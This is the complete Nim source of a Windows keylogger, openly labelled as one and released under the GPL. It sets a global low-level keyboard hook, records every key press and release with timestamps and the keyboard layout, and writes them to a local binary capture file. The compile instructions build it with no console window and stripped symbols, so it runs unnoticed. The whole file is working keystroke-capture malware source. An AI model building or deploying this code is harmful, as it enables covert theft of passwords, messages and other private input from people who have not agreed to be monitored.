#    This script implements a keylogger and saves keyboard events in a Keyboard Catpure file
#    Copyright (C) 2024  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.

# To compile on windows with nim 2.0.8:
# nim --app:gui c --stackTrace:off  --lineTrace:off --checks:off --assertions:off -d:release --passl:"-s" Keylogger.nim

import winim/lean
import times, system

# https://learn.microsoft.com/sr-cyrl-rs/windows/win32/api/winuser/ns-winuser-kbdllhookstruct
type KBDLLHOOKSTRUCT = object
  vkCode: DWORD
  scanCode: DWORD
  flags: DWORD
  time: DWORD
  dwExtraInfo: ULONG_PTR

var hHook: HHOOK = 0
var timestamp: float
var int_timestamp: uint32
var last_time: uint32
let filename: string = "KeyboardCature.keyc"

const
  KeyC: array[0..3, char] = ['K', 'e', 'y', 'C']

type
  KeyEntry = object
    state_seconds: uint32     # First bit: is_pressed, 31 last bits: seconds since the header Unix timestamp
    virtualKeyCode: uint8     # Virtual key code

type
  BaseKeyLog = object
    magicBytes: array[0..3, char]   # Magic bytes
    timestamp: uint32               # Unix timestamp
    keyboardLayoutCode: uint32      # Keyboard layout code
    numberOfEntries: uint32         # Number of entries

type
  KeyLog = object
    magicBytes: array[0..3, char]   # Magic bytes
    timestamp: uint32               # Unix timestamp
    keyboardLayoutCode: uint32      # Keyboard layout code
    numberOfEntries: uint32         # Number of entries
    entries: seq[KeyEntry]          # Dynamic array of entries

var keylogheaders: KeyLog

proc createKeyLog(): KeyLog =
  result.magicBytes = KeyC
  result.timestamp = int_timestamp
  result.keyboardLayoutCode = uint32(GetKeyboardLayout(0))
  result.numberOfEntries = 0
  result.entries = @[]

proc add_keyboard_event(vkCode: int, is_pressed: int) =
  keylogheaders.numberOfEntries += 1
  let time = uint32(epochTime()) - int_timestamp
  let keyentry: KeyEntry = KeyEntry(state_seconds: time or uint32(is_pressed shl 31), virtualKeyCode: uint8(vkCode))
  keylogheaders.entries.add(keyentry)

  if (time - last_time > 10) and keylogheaders.entries.len != 0:
    let file = system.open(filename, fmReadWriteExisting)
    file.setFilePos(sizeof(BaseKeyLog) - 4, fspSet)
    var check = file.writeBuffer(addr keylogheaders.numberOfEntries, sizeof(keylogheaders.numberOfEntries))
    if check != sizeof(keylogheaders.numberOfEntries):
      file.close()
      return
    file.setFilePos(0, fspEnd)

    for entry in keylogheaders.entries:
      check = file.writeBuffer(addr entry, 5)
      if check != 5:
        file.close()
        return
      file.flushFile()

    file.close()
    keylogheaders.entries.setLen(0)
    last_time = time

proc keyboard_callback(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} =
  if nCode >= 0:
    let p = cast[ptr KBDLLHOOKSTRUCT](lParam)
    var is_pressed: int
    case wParam
    of WM_KEYDOWN, WM_SYSKEYDOWN:
      is_pressed = 0
    of WM_KEYUP, WM_SYSKEYUP:
      is_pressed = 1
    else: discard

    add_keyboard_event(p.vkCode, is_pressed)

  return CallNextHookEx(0, nCode, wParam, lParam)

proc main() =
  hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_callback, 0, 0)
  if hHook == 0:
    echo "Failed to set keyboard hook"
    return

  timestamp = epochTime()
  int_timestamp = uint32(timestamp)
  keylogheaders = createKeyLog()

  let file = open(filename, fmReadWrite)
  let check = file.writeBuffer(addr keylogheaders, sizeof(BaseKeyLog))
  file.close()
  if check != sizeof(BaseKeyLog):
    echo "Failed to write in file"
    return

  var msg: MSG
  while GetMessage(addr msg, 0, 0, 0) != 0:
    TranslateMessage(addr msg)
    DispatchMessage(addr msg)

  UnhookWindowsHookEx(hHook)

main()
